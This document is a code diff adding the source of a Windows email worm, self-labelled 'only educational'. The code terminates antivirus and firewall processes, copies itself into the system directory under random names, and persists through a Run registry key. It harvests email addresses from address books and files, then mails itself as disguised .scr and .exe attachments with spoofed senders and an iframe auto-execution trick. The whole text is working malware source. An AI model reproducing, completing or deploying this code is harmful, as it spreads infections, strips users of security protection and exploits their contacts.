@@ -1,0 +1,907 @@
+   /*******************************************/
+   /* Copyright 2002 (c)  Otto von Gutenberg  */
+   /* Type: W32/Worm/Email + Memory resident  */
+   /*      running as the service application */
+   /* Features: Memory scanning + In WAB file */
+   /*           addresses seeking */
+   /* Purpose: only educational                */
+   /* Platforms: Win9x/WinNT/Win2000 - WinXP? */
+   /*******************************************/
+   /* THE AUTHOR OF THIS WORM IS NO          */
+   /* RESPONSIBLE OF THE DAMAGES CAUSED BY IT */
+   /*******************************************/
+
+
+
+   #include <winsock.h>
+   #include <fstream.h>
+   #include <tlhelp32.h>
+   #include <string.h>
+   #include <stdlib.h>
+   #include <stdio.h>
+   #include "reg_proc.h"
+   #include "basehead.h"
+   #include "findhead.h"
+
+
+
+   #define CRLF "\r\n"
+   #define BP_ROWS 16
+   #define BP_COLS 7
+   #define BW_TOTAL 7
+   #define TOTAL_EXT 8
+   #define THREADS_TOTAL 4
+   #define MAX_EMAILS 150
+   #define MAX_SUBJECTS 2
+   #define MAX_FROMS 5
+   #define MAX_ATTACHMENTS 3
+
+   #define ERROR_LEVEL_NONE 0
+   #define ERROR_LEVEL_SEND 1
+   #define ERROR_LEVEL_RECEIVE 2
+
+
+   char* bad_windows_list[BW_TOTAL] = {"Norton","AVP","Anti","Vir","McAfee","anti","vir"};
+   char* Extensions[TOTAL_EXT] = {".DBX",".MBX",".WAB",".HTML",".EML",".HTM",".ASP",".SHTML"};
+
+   char* bad_processes_list[BP_ROWS][BP_COLS] = { {"AVP32.EXE","AVPMON.EXE","ZONEALARM.EXE","VSHWIN32.EXE","VET95.EXE","TBSCAN.EXE","SERV95.EXE"},
+                                       {"SCAN32.EXE","RAV7.EXE","NAVW.EXE","OUTPOST.EXE","NMAIN.EXE","NAVNT.EXE","MPFTRAY.EXE"},
+                                       {"LOCKDOWN2000.EXE","ICSSUPPNT.EXE","ICLOAD95.EXE","IAMAPP.EXE","FINDVIRU.EXE","F-AGNT95.EXE","DV95.EXE"},
+                                       {"DV95_O.EXE","CLAW95CT.EXE","CFIAUDIT.EXE","AVWUPD32.EXE","AVPTC32.EXE","_AVP32.EXE","AVGCTRL.EXE"},
+                                       {"APVXDWIN.EXE","_AVPCC.EXE","AVPCC.EXE","WFINDV32.EXE","VSECOMR.EXE","TDS2-NT.EXE","SWEEP95.EXE"},
+                                       {"SCRSCAN.EXE","SAFEWEB.EXE","PERSFW.EXE","NAVSCHED.EXE","NVC95.EXE","NISUM.EXE","NAVLU32.EXE"},
+                                       {"MOOLIVE.EXE","JED.EXE","ICSUPP95.EXE","IBMAVSP.EXE","FRW.EXE","F-STOPW.EXE","ESPWATCH.EXE"},
+                                       {"DVP95.EXE","CLAW95.EXE","CFIADMIN.EXE","AVWIN95.EXE","AVPM.EXE","AVP.EXE","AVE32.EXE"},
+                                       {"ANTI-TROJAN.EXE","WEBSCAN.EXE","WEBSCANX.EXE","VSSCAN40.EXE","TDS2-98.EXE","SPHINX.EXE","SCANPM.EXE"},
+                                       {"RESCUE.EXE","PCFWALLICON.EXE","PAVCL.EXE","NUPGRADE.EXE","NAVWNT.EXE","NAVAPW32.EXE","LUALL.EXE"},
+                                       {"IOMON98.EXE","ICMOON.EXE","IBMASN.EXE","FPROT.EXE","F-PROT95.EXE","ESAFE.EXE","CLEANER3.EXE"},
+                                       {"EFINET32.EXE","BLACKICE.EXE","AVSCHED32.EXE","AVPDOS32.EXE","AVPNT.EXE","AVCONSOL.EXE","ACKWIN32.EXE"},
+                                       {"VSSTAT.EXE","VETTRAY.EXE","TCA.EXE","SMC.EXE","SCAN95.EXE","RAV7WIN.EXE","PCCWIN98.EXE"},
+                                       {"PADMIN.EXE","NORMIST.EXE","NAVW32.EXE","N32SCAN.EXE","LOOKOUT.EXE","IFACE.EXE","ICLOADNT.EXE"},
+                                       {"IAMSERV.EXE","FP-WIN.EXE","F-PROT.EXE","ECENGINE.EXE","CLEANER.EXE","CFIND.EXE","BLACKD.EXE"},
+                                       {"AVPUPD.EXE","AVKSERV.EXE","AUTODOWN.EXE","_AVPM.EXE","AVPM.EXE","REGEDIT.EXE",""}};
+
+
+
+   LPTSTR szOSVersion;
+   char szFilename[MAX_PATH];
+   char szRegistry[MAX_PATH];
+   DWORD dwThreads[THREADS_TOTAL];
+   FILE* debug; //debug
+
+   SOCKET hServer;
+   WSADATA wsData;
+   char szServer[64] = "", szMail[64] = "", szHelo[64] = "";
+   char szBuffer[4096],szLine[255],szMsgLine[255];
+
+   char szDefaultServer[] = "194.186.232.165";
+   char szDefaultMail[] = "otto_vg@ok.kz";
+   char szDefaultHelo[] = "ok.kz";
+
+   char Emails[MAX_EMAILS][64];
+   char Subjects[MAX_SUBJECTS][255] = {"Loveletter for you comes","For my people"};
+   char Froms[MAX_FROMS][255] = {"IIS Exchange Board <iis@microsoft.com>","Smashing pumpkins <smash@smash.com>","Christine <aguilera@aguilera.com>","Strauss <strauss@annung.de>","Rudolf Ginsberg <rudolf@ginsberg.com>"};
+   char Attachments[MAX_ATTACHMENTS][64] = {"HellaGood.exe","Avril.scr","AvrilFuns.scr"};
+   int ErrorLevel = ERROR_LEVEL_NONE;
+   int TotalEmails = 0;
+   int CurrentEmail = 0;
+
+
+
+   //<-----------------------RetRndNumber----------------------->
+   int RetRndNumber(int NBound)
+   {
+       //0 =< RetRndNumber <= NBound-1
+       return (int)(rand() % NBound);
+   }
+
+
+
+   //<-----------------------RetRndString----------------------->
+   LPSTR RetRndString(int Dim)
+   {
+       char Set1[26] = {   'A','B','C','D','E','F','G','H','0','1',
+                           '2','3','4','5','6','7','8','9','a','b',
+                           'c','d','e','f','g','h'};
+       char strTemp[64] = "";
+
+       for (int i=0;i<Dim;i++)
+       {
+           strTemp[i] = Set1[RetRndNumber(26)];
+       }
+       char* str1 = new char[64];
+       lstrcpy(str1,strTemp);
+       return str1;
+   }
+
+
+   //<-----------------------WndEnumProcMine----------------------->
+   BOOL CALLBACK WndEnumProcMine(HWND hwnd1,long l1)
+   {
+       LPTSTR str1 = new char[255];
+       GetWindowText(hwnd1,str1,255);
+       if (BadWindow(str1))
+       {
+           DWORD dwProcessId;
+           GetWindowThreadProcessId(hwnd1,&dwProcessId);
+           if (dwProcessId!=GetCurrentProcessId())
+           {
+               HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);
+               TerminateProcess(hProcess,0);
+               CloseHandle(hProcess);
+           }
+       }
+       return TRUE;
+   }
+
+
+   //<-----------------------BadWindow----------------------->
+   BOOL BadWindow(LPSTR strWindow)
+   {
+       BOOL res = FALSE;
+       for (int i=0;i<BW_TOTAL;i++)
+           if (strstr(strWindow,bad_windows_list[i])!=0) res = TRUE;
+       return res;
+   }
+
+
+   //<-------BOOL BadProcess(LPSTR strModule)
+   BOOL BadProcess(LPSTR strModule)
+   {
+       BOOL res = FALSE;
+       int i,j;
+       for (i=0;i<BP_ROWS;i++)
+           for (j=0;j<BP_COLS;j++)
+               if (strstr(strModule,bad_processes_list[i][j])!=0 && bad_processes_list[i][j]!="") res = TRUE;
+       return res;
+   }
+   //BOOL BadProcess(LPSTR strModule)---------->
+
+
+   //<-----------------------EnumProcessesOther----------------------->
+   void EnumProcessesOther()
+   {
+       LPARAM c = 0;
+       EnumWindows((WNDENUMPROC)WndEnumProcMine,c);
+   }
+
+
+   //<-----------------------EnumProcessesWin98----------------------->
+   void EnumProcessesWin98()
+   {
+       HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
+       PROCESSENTRY32 pr_inf;
+       LPSTR strModule = new char[255];
+
+       pr_inf.dwSize = sizeof(PROCESSENTRY32);
+
+       if(Process32First(hSnapshot,&pr_inf))
+       {
+           do
+           {
+               if (BadProcess(pr_inf.szExeFile) && (pr_inf.th32ProcessID!=GetCurrentProcessId()))
+               {
+                   HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pr_inf.th32ProcessID);
+                   TerminateProcess(hProcess,0);
+                   CloseHandle(hProcess);
+               }
+           }
+           while(Process32Next(hSnapshot,&pr_inf));
+       }
+       CloseHandle(hSnapshot);
+   }
+
+
+
+   //<-----------------------EncodeBase64----------------------->
+   void EncodeBase64(char strFile[MAX_PATH])
+   {
+       char Alphabet[64]={ 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',
+                           'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',
+                           'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
+                           'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/' };
+
+       unsigned char bytes[3];
+       unsigned int incr,total,total1=0;
+       unsigned char char1;
+       char* szTempPath = new char[MAX_PATH];
+       char* szPath = new char[MAX_PATH];
+
+       GetTempPath(MAX_PATH,szTempPath);
+       lstrcpy(szPath,szTempPath);
+       strcat(szPath,"\\NewBoot.sys");
+
+       FILE* fin = fopen(strFile,"rb");
+       FILE* fout = fopen(szPath,"w");
+       incr = -1;
+       total = 0;
+       while(!feof(fin))
+       {
+           total1++;
+           incr++;
+           if(incr==3)
+           {
+               incr = -1;
+               char1 = bytes[0] >> 2;
+               fprintf(fout,"%c",Alphabet[char1]);
+               char1 = ((bytes[0] << 6) | (bytes[1] >> 2));
+               char1 = char1 >> 2;
+               fprintf(fout,"%c",Alphabet[char1]);
+               char1 = bytes[1] << 4;
+               char1 = char1 >> 2;
+               char1 = char1 | (bytes[2] >> 6);
+               fprintf(fout,"%c",Alphabet[char1]);
+               char1 = bytes[2] << 2;
+               char1 = char1 >> 2;
+               fprintf(fout,"%c",Alphabet[char1]);
+               total+=4;
+           }
+           else fscanf(fin,"%c",&bytes[incr]);
+           if(total==76)
+           {
+               total = 0;
+               fprintf(fout,"\n");
+           }
+       }
+
+
+       if (incr==1)
+       {
+           char1 = bytes[0] >> 2;
+           fprintf(fout,"%c",Alphabet[char1]);
+           char1 = ((bytes[0] << 6) | 0);
+           char1 = char1 >> 2;
+           fprintf(fout,"%c==",Alphabet[char1]);
+       }
+       if (incr==2)
+       {
+           char1 = bytes[0] >> 2;
+           fprintf(fout,"%c",Alphabet[char1]);
+           char1 = ((bytes[0] << 6) | (bytes[1] >> 2));
+           char1 = char1 >> 2;
+           fprintf(fout,"%c",Alphabet[char1]);
+           char1 = bytes[1] << 4;
+           char1 = char1 >> 2;
+           char1 = char1 | 0;
+           fprintf(fout,"%c=",Alphabet[char1]);
+       }
+       fclose(fin);
+       fclose(fout);
+
+   }
+
+
+   //<-----------------------RegisterServiceProcess----------------------->
+   BOOL RegisterServiceProcess(DWORD dwProcessId, DWORD dwRegisterFlag)
+   {
+       HINSTANCE hKernel32Dll;
+       LPREGISTERSERVICEPROCESS lpRegisterServiceProcess;
+
+       hKernel32Dll = LoadLibrary("KERNEL32.DLL");
+       if(!hKernel32Dll) return FALSE;
+       lpRegisterServiceProcess = (LPREGISTERSERVICEPROCESS) GetProcAddress(hKernel32Dll, "RegisterServiceProcess");
+       if(!lpRegisterServiceProcess) return FALSE;
+       lpRegisterServiceProcess(dwProcessId, dwRegisterFlag);
+       FreeLibrary(hKernel32Dll);
+       return TRUE;
+   }
+
+   //<-----------------------GetOSVersion----------------------->
+   BOOL GetOSVersion()
+   {
+       OSVERSIONINFO os_inf1;
+       os_inf1.dwOSVersionInfoSize = sizeof(os_inf1);
+       GetVersionEx(&os_inf1);
+       char* str_buf = new char[255];
+       sprintf(str_buf,"%d/%d/%d",os_inf1.dwPlatformId,os_inf1.dwMajorVersion,os_inf1.dwMinorVersion);
+       if (strstr(str_buf,"1/4/0")!=0)
+       {
+           szOSVersion = "Win95";
+           return TRUE;
+       }
+       if (strstr(str_buf,"1/4/10")!=0)
+       {
+           szOSVersion = "Win98";
+           return TRUE;
+       }
+       if (strstr(str_buf,"2/3/51")!=0)
+       {
+           szOSVersion = "WinNT351";
+           return TRUE;
+       }
+       if (strstr(str_buf,"2/4/0")!=0)
+       {
+           szOSVersion = "WinNT4";
+           return TRUE;
+       }
+       return FALSE;
+   }
+
+
+   //<-----------------------ThreadSpy----------------------->
+   DWORD CALLBACK ThreadSpy(LPVOID lpThreadParameter)
+   {
+       while (TRUE)
+       {
+           Sleep(45000);
+           if (strstr(szOSVersion,"Win98")!=0) EnumProcessesWin98();
+           else EnumProcessesOther();
+       }
+       return TRUE;
+   }
+
+   //<-----------------------ApproveFileExtension----------------------->
+   BOOL ApproveFileExtension(LPTSTR strFileName)
+   {
+       for (int i=0;i<TOTAL_EXT;i++)
+           if (strstr(strFileName,Extensions[i])!=0) return TRUE;
+       return FALSE;
+   }
+
+   //<-----------------------RecurseSeek----------------------->
+   void RecurseSeek(LPTSTR strPath)
+   {
+       WIN32_FIND_DATA wfd1;
+       HANDLE hFound;
+       char szPath[MAX_PATH];
+
+       hFound = FindFirstFile(strPath,&wfd1);
+       do
+       {
+           strcpy(szPath,strPath);
+           szPath[strlen(strPath)-1] = 0;
+           strcat(szPath,wfd1.cFileName);
+           if ((wfd1.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY || wfd1.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM) && (strstr(wfd1.cFileName,".")==0))
+           {
+               strcat(szPath,"\\*");
+               RecurseSeek(szPath);
+           }
+           else if (ApproveFileExtension(strupr(wfd1.cFileName)) && (!(wfd1.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY || wfd1.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM)))
+           {
+               if (strstr(strupr(wfd1.cFileName),".WAB")!=0) GetAddressesInWAB(szPath);
+               else GetAddressesInFile(szPath);
+           }
+       } while (FindNextFile(hFound,&wfd1));
+       FindClose(hFound);
+   }
+
+
+   //<-----------------------ThreadFileSearch----------------------->
+   DWORD CALLBACK ThreadFileSearch(LPVOID lpThreadParameter)
+   {
+       HKEY hKey;
+       unsigned char strBuffer[1024];
+       DWORD dwBuffer=sizeof(strBuffer);
+       char str2[1024];
+       char* strTemp = new char[1024];
+       int i;
+
+       RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\WAB\\Wab File Name",0,KEY_QUERY_VALUE,&hKey);
+       dwBuffer = sizeof(strBuffer);
+       RegQueryValueEx(hKey,"",0,NULL,strBuffer,&dwBuffer);
+       sprintf(str2,"%s",strBuffer);
+       RegCloseKey(hKey);
+
+       lstrcpy(strTemp,str2);
+       for (i=strlen(strTemp)-1;i>0;i--)
+           if (strTemp[i]=='\\') break;
+           else strTemp[i] = 0;
+       strcat(strTemp,"*");
+       GetAddressesInWAB(str2);
+       RecurseSeek(strTemp);
+       RecurseSeek("C:\\*");
+       return TRUE;
+   }
+
+
+   //<-----------------------ThreadCheckRegistry----------------------->
+   DWORD CALLBACK ThreadCheckRegistry(LPVOID lpThreadParameter)
+   {
+       HKEY hKey;
+       LPCTSTR lpValueName = "Mortimer";
+       unsigned char lpData[1024];
+       DWORD dwData = sizeof(lpData);
+
+       sprintf((char*)lpData,"%s",szRegistry);
+       while (TRUE)
+       {
+           RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey);
+           RegSetValueEx(hKey,lpValueName,0,REG_SZ,lpData,dwData);
+       }
+       return TRUE;
+   }
+
+   //<-----------------------ThreadMessaging----------------------->
+   DWORD CALLBACK ThreadMessaging(LPVOID lpThreadParameter)
+   {
+       while(TRUE)
+       {
+           if (CurrentEmail+1<=TotalEmails)
+           {
+               if(ConnectTo())
+               {
+                   SendTo(Emails[CurrentEmail]);
+                   CurrentEmail++;
+               }
+           }
+       }
+   }
+
+
+   //<-----------------------InfectWindows----------------------->
+   BOOL InfectWindows()
+   {
+       HKEY hKey;
+       unsigned char strBuffer[1024];
+       DWORD dwBuffer=sizeof(strBuffer);
+       char str2[1024];
+       char* strTemp = new char[1024];
+       int i;
+       LPSTR szTempPath = new char[MAX_PATH];
+       char strTmp[MAX_PATH];
+
+       strTemp="";
+       RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\OvG\\Mutter",0,KEY_QUERY_VALUE,&hKey);
+       RegQueryValueEx(hKey,"",0,NULL,strBuffer,&dwBuffer);
+       sprintf(str2,"%s",strBuffer);
+       if (strstr(str2,"SONNE")==0)
+       {
+           RegCreateKey(HKEY_LOCAL_MACHINE,"\\Software\\OvG\\Mutter",&hKey);
+           RegSetValueEx(hKey,"",0,REG_SZ,(LPBYTE)"SONNE",5);
+       }
+       RegCloseKey(hKey);
+
+
+       GetSystemDirectory(szTempPath,MAX_PATH);
+       lstrcpy(strTmp,RetRndString(11));
+       lstrcat(strTmp,".EXE");
+       lstrcat(szTempPath,"\\");
+       lstrcat(szTempPath,strTmp);
+       CopyFile(szFilename,szTempPath,FALSE);
+       lstrcpy(szRegistry,szTempPath);
+       for (i=0;i<RetRndNumber(11);i++)
+       {
+           lstrcpy(strTmp,RetRndString(11));
+           lstrcat(strTmp,".EXE.TMP");
+           GetTempPath(MAX_PATH,szTempPath);
+           lstrcat(szTempPath,strTmp);
+           CopyFile(szFilename,szTempPath,FALSE);
+       }
+       return TRUE;
+   }
+
+   //<-----------------------WinMain----------------------->
+   int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInst,LPSTR lpCmdLine,int nShowCmd)
+   {
+       debug = fopen("D:\\debug.txt","w");
+       srand((unsigned int)GetTickCount());
+       GetModuleFileName(hInstance,szFilename,MAX_PATH);
+       strcpy(szRegistry,szFilename);
+       GetServer();
+       GetOSVersion();
+       ErrorLevel = ERROR_LEVEL_NONE;
+       strcpy(szFilename,"C:\\autoexec.bat");
+       if (ConnectTo()) MsgBox("Connected");
+       if (SendTo("fsau@irex.org")) MsgBox("Sent");
+       if (ErrorLevel==ERROR_LEVEL_NONE) MsgBox("No Error");
+       fclose(debug);
+       return (0);
+
+       srand((unsigned int)GetTickCount());
+       GetModuleFileName(hInstance,szFilename,MAX_PATH);
+       strcpy(szRegistry,szFilename);
+       InfectWindows();
+       GetServer();
+       GetOSVersion();
+       ErrorLevel = ERROR_LEVEL_NONE;
+       if (strstr(szOSVersion,"Win98")!=0) RegisterServiceProcess(NULL,1);
+       CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)&ThreadSpy,NULL,NULL,&dwThreads[0]);
+       CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)&ThreadFileSearch,NULL,NULL,&dwThreads[1]);
+       CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)&ThreadCheckRegistry,NULL,NULL,&dwThreads[2]);
+       CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)&ThreadMessaging,NULL,NULL,&dwThreads[3]);
+       while (TRUE) ;
+       return (0);
+   }
+
+
+
+
+   //Net shared tools and routines starts here
+   void MsgBox(LPTSTR strMessage)
+   {
+       MessageBox(0,strMessage,"Send Sample",0);
+   }
+
+
+   BOOL Check(int iStatus)
+   {
+       if (iStatus!=SOCKET_ERROR && iStatus!=0)
+       {
+           return TRUE;
+       }
+       return FALSE;
+   }
+
+   void Send()
+   {
+       if(!Check(send(hServer,szMsgLine,strlen(szMsgLine),0)))
+           ErrorLevel = ERROR_LEVEL_SEND;
+       fprintf(debug,"%d%s",ErrorLevel,szMsgLine); //debug
+   }
+
+   void Receive()
+   {
+       if(!Check(recv(hServer,szBuffer,sizeof(szBuffer),0)))
+           ErrorLevel = ERROR_LEVEL_RECEIVE;
+       if (szBuffer[0]=='4' || szBuffer[0]=='5') ErrorLevel = ERROR_LEVEL_RECEIVE;
+       fprintf(debug,"%d%s",ErrorLevel,szBuffer); //debug
+   }
+
+
+   BOOL ConnectTo()
+   {
+       ErrorLevel = ERROR_LEVEL_NONE;
+       LPHOSTENT lpHostEntry;
+       SOCKADDR_IN SockAddr;
+
+       if(WSAStartup(MAKEWORD(1,1),&wsData)) return FALSE;
+
+       if(strlen(szServer)>0) lpHostEntry = gethostbyname(szServer);
+       else lpHostEntry = gethostbyname(szDefaultServer);
+
+       if (lpHostEntry==NULL) return FALSE;
+
+       hServer = socket(PF_INET,SOCK_STREAM,0);
+       if (hServer==INVALID_SOCKET) return FALSE;
+
+       SockAddr.sin_family = AF_INET;
+       SockAddr.sin_port = htons(IPPORT_SMTP);
+       SockAddr.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
+       if (connect(hServer,(PSOCKADDR)&SockAddr,sizeof(SockAddr))) return FALSE;
+       Receive();
+       return TRUE;
+   }
+
+
+
+   BOOL SendTo(LPSTR strTo)
+   {
+       FILE* file_list1 = fopen("C:\\listrecp.txt","a");
+       fprintf(file_list1,"%s\n",strTo);
+       fclose(file_list1);
+
+       FILE* file1;
+       char szTempPath[MAX_PATH];
+       char szPath[MAX_PATH];
+       char szBuf[76];
+       char* szBuf2 = new char[76];
+
+
+       if (strlen(szHelo)>0) sprintf(szMsgLine,"HELO <%s>%s",szHelo,CRLF);
+       else sprintf(szMsgLine,"HELO %s%s",szDefaultHelo,CRLF);
+       Send(); Receive();
+
+       if (strlen(szMail)>0) sprintf(szMsgLine,"MAIL FROM: <%s>%s",szMail,CRLF);
+       else sprintf(szMsgLine,"MAIL FROM: <%s>%s",szDefaultMail,CRLF);
+       Send(); Receive();
+
+       sprintf(szMsgLine,"RCPT TO: <%s>%s",strTo,CRLF);
+       Send(); Receive();
+       sprintf(szMsgLine,"DATA%s",CRLF);
+       Send(); Receive();
+
+       //MIME routine begins
+       sprintf(szMsgLine,"To: %s%s",strTo,CRLF); Send();
+       sprintf(szMsgLine,"Subject: %s%s",Subjects[RetRndNumber(MAX_SUBJECTS)],CRLF); Send();
+       sprintf(szMsgLine,"Date: %s%s","Tue, 7 Nov 2002 19:12:00 +0300",CRLF); Send();
+       sprintf(szMsgLine,"From: %s%s",Froms[RetRndNumber(MAX_FROMS)],CRLF); Send();
+       sprintf(szMsgLine,"Message-ID: <ADCB1234111ADDEFG345673456>%s",CRLF); Send();
+       sprintf(szMsgLine,"MIME-Version: 1.0%s",CRLF); Send();
+       sprintf(szMsgLine,"Content-Type: multipart/mixed; boundary=\"--ABCDEF\"%s",CRLF); Send();
+       sprintf(szMsgLine,"X-Priotity: 3%s",CRLF); Send();
+       sprintf(szMsgLine,"X-MSMail-Priority: Normal%s",CRLF); Send();
+       sprintf(szMsgLine,"X-Mailer: Microsoft Outlook Express 5.50%s",CRLF); Send();
+       sprintf(szMsgLine,"X-MimeOLE: Produced by Microsoft MimeOLE v 5.50%s",CRLF); Send();
+       sprintf(szMsgLine,"%sThis is a multipart MIME-coded message%s%s",CRLF,CRLF,CRLF); Send();
+       sprintf(szMsgLine,"----ABCDEF%s",CRLF); Send();
+       sprintf(szMsgLine,"Content-Type: text/html; charset=\"us-ascii\"%s",CRLF); Send();
+       sprintf(szMsgLine,"Content-Transfer-Encoding: quoted-printable%s%s",CRLF,CRLF); Send();
+       sprintf(szMsgLine,"%s",CRLF); Send();
+       sprintf(szMsgLine,"<HTML><HEAD></HEAD><BODY><H1>EDUCATIONAL PURPOSE</H1><BR>%s",CRLF); Send();
+       sprintf(szMsgLine,"<H3>Avril FUNS subscription</H3><BR>%s",CRLF); Send();
+       sprintf(szMsgLine,"<iframe src=3Dcid:SOMECID height=3D0 width=3D0></iframe></BODY></HTML>%s",CRLF); Send();
+       sprintf(szMsgLine,"----ABCDEF%s",CRLF); Send();
+       sprintf(szMsgLine,"Content-Type: audio/x-wav; name=\"%s\"%s",Attachments[RetRndNumber(MAX_ATTACHMENTS)],CRLF); Send();
+       sprintf(szMsgLine,"Content-Transfer-Encoding: base64%s",CRLF); Send();
+       sprintf(szMsgLine,"Content-Disposition: attachment; filename=\"%s\"%s",Attachments[RetRndNumber(MAX_ATTACHMENTS)],CRLF); Send();
+       sprintf(szMsgLine,"Content-ID: <SOMECID>%s",CRLF); Send();
+       sprintf(szMsgLine,"%s",CRLF); Send();
+       //trying to attach main file
+       char* strFile1 = new char[MAX_PATH];
+       lstrcpy(strFile1,szFilename);
+       EncodeBase64(strFile1);
+       GetTempPath(MAX_PATH,szTempPath);
+       sprintf(szPath,"%sNewBoot.sys",szTempPath);
+       file1 = fopen(szPath,"rb");
+       while(!feof(file1))
+       {
+           fscanf(file1,"%s\n",szBuf);
+           sprintf(szMsgLine,"%s%s",szBuf,CRLF);
+           Send();
+       }
+       fclose(file1);
+       //trying to attach main file - ends
+       sprintf(szMsgLine,"%s",CRLF); Send();
+       sprintf(szMsgLine,"----ABCDEF--%s",CRLF); Send();
+       //MIME routine ends
+
+       sprintf(szMsgLine,"%s.%s",CRLF,CRLF);
+       Send(); Receive();
+       sprintf(szMsgLine,"QUIT%s",CRLF);
+       Send(); Receive();
+
+       closesocket(hServer);
+       WSACleanup();
+       return TRUE;
+   }
+
+
+
+
+   BOOL IsItAffordableChar(char c1)
+   {
+       int res = FALSE;
+       if (c1>=48 && c1<=57) res = TRUE;
+       if (c1==45 || c1==95) res = TRUE;
+       if (c1>=65 && c1<=90) res = TRUE;
+       if (c1>=97 && c1<=122) res = TRUE;
+       if (c1=='.') res = TRUE;
+       return (res);
+   }
+
+
+
+   BOOL GetAddressesInWAB(char* strFile)
+   {
+       const BufMax = 20;
+       int i;
+       FILE* fin;
+       char strBuffer[BufMax];
+       char strAddress[64];
+       fin = fopen(strFile,"rb");
+       if (fin==NULL) return FALSE;
+       while(!feof(fin))
+       {
+           char ch1;
+           fscanf(fin,"%c",&ch1);
+           if (ch1=='@')
+           {
+               strcpy(strAddress,"");
+               int char_pos = BufMax % 2;
+               for (i=BufMax-1;i>0;i--)
+               {
+                   if (i%2 == char_pos)
+                   {
+                       if (!IsItAffordableChar(strBuffer[i])) break;
+                       char str1[1];
+                       sprintf(str1,"%c",strBuffer[i]);
+                       strcat(strAddress,str1);
+                   }
+               }
+               strrev(strAddress);
+               if (strlen(strAddress)>0)
+               {
+                   BOOL blEmail = FALSE;
+                   strcat(strAddress,"@");
+                   char c1 = 'a', c2 ='a'; i = 0;
+                   do
+                   {
+                       i++;
+                       if (i%2==0)
+                       {
+                           fscanf(fin,"%c",&c2);
+                           char* str1 = new char[1];
+                           sprintf(str1,"%c",c2);
+                           if (c2=='.') blEmail = TRUE;
+                           if (IsItAffordableChar(c2)) strcat(strAddress,str1);
+                       }
+                       else fscanf(fin,"%c",&c1);
+                   } while (IsItAffordableChar(c2));
+                   if (blEmail) AddEmail(strAddress);
+               }
+           }
+           else
+           {
+               for(i=0;i<BufMax-1;i++) strBuffer[i]=strBuffer[i+1];
+               strBuffer[BufMax-1]=ch1;
+           }
+       }
+       fclose(fin);
+       return TRUE;
+   }
+
+
+
+   BOOL GetAddressesInFile(char* strFile)
+   {
+       const BufMax = 20;
+       int i;
+       FILE* fin;
+       char strBuffer[BufMax];
+       char strAddress[64];
+       char ch1;
+       fin = fopen(strFile,"rb");
+       if (fin==NULL) return FALSE;
+       while(!feof(fin))
+       {
+           fscanf(fin,"%c",&ch1);
+           if (ch1=='@')
+           {
+               strcpy(strAddress,"");
+               for (i=BufMax-1;i>0;i--)
+               {
+                   if (!IsItAffordableChar(strBuffer[i])) break;
+                   char str1[1];
+                   sprintf(str1,"%c",strBuffer[i]);
+                   strcat(strAddress,str1);
+               }
+               strrev(strAddress);
+               if (strlen(strAddress)>0)
+               {
+                   BOOL blEmail = FALSE;
+                   char c2 = 'a';
+                   strcat(strAddress,"@");
+                   while(IsItAffordableChar(c2))
+                   {
+                       char* str1 = new char[1];
+                       fscanf(fin,"%c",&c2);
+                       sprintf(str1,"%c",c2);
+                       if (c2=='.') blEmail = TRUE;
+                       if (IsItAffordableChar(c2)) strcat(strAddress,str1);
+                   }
+                   if (blEmail) AddEmail(strAddress);
+               }
+           }
+           else
+           {
+               for(i=0;i<BufMax-1;i++) strBuffer[i]=strBuffer[i+1];
+               strBuffer[BufMax-1]=ch1;
+           }
+       }
+       fclose(fin);
+       return TRUE;
+   }
+
+
+
+
+   BOOL AddEmail(LPTSTR strEmail)
+   {
+       if (!(TotalEmails<=MAX_EMAILS)) return FALSE;
+       for (int i=0;i<TotalEmails;i++)
+           if (strcmp(Emails[i],strEmail)==0) return FALSE;
+       lstrcpy(Emails[TotalEmails],strEmail);
+       TotalEmails++;
+       return TRUE;
+   }
+
+
+
+   void GetServer()
+   {
+       //thanks to mia_pirat
+       int i,j;
+       char key2[256];
+       unsigned char acc[1024],smtp[1024],eml[1024];
+       DWORD acclen=sizeof(acc), smtplen=sizeof(smtp), emllen=sizeof(eml);
+       HKEY hKey;
+
+       strcpy(key2,"Software\\Microsoft\\Internet Account Manager");
+       RegOpenKeyEx(HKEY_CURRENT_USER,key2,0,KEY_QUERY_VALUE,&hKey);
+       RegQueryValueEx(hKey,"Default Mail Account",0,NULL,acc,&acclen);
+       RegCloseKey(hKey);
+       strcpy(key2,"Software\\Microsoft\\Internet Account Manager\\Accounts\\");
+       j=strlen(key2);
+       for (i=0;i<8;i++)
+       {
+           key2[j+i]=acc[i];
+       }
+       key2[j+i]=0;
+       RegOpenKeyEx(HKEY_CURRENT_USER,key2,0,KEY_QUERY_VALUE,&hKey);
+       RegQueryValueEx(hKey,"SMTP Server",0,NULL,smtp,&smtplen);
+       RegCloseKey(hKey);
+       if (smtp[0]>44 && smtp[0]<123)
+       {
+           i=0;
+           while (smtp[i]!=0)
+           {
+               szServer[i]=smtp[i];
+               i++;
+           }
+           szServer[i]=0;
+           RegOpenKeyEx(HKEY_CURRENT_USER,key2,0,KEY_QUERY_VALUE,&hKey);
+           RegQueryValueEx(hKey,"SMTP Email Address",0,NULL,eml,&emllen);
+           RegCloseKey(hKey);
+           if (eml[0]>44 && eml[0]<123)
+           {
+               i=0;
+               while (eml[i]!=0)
+               {
+                   szMail[i]=eml[i];
